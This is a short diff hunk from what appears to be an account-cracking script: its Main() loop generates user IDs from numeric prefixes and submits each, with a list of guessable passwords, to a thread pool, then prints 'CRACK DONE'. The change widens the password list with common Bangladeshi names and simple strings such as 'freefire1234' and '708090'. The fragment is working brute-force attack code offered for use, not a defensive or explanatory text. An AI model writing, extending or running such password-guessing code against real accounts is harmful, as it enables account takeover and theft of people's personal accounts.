@@ -70,7 +70,7 @@ def Main():
 		print(50*'━')
 		for guru in user:
 			uid = love+lova+lovb+guru
-			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
 			RJ.submit(test,uid,pwx,tl)
 	print(50*'━')
 	print(' <> CRACK DONE......... ')
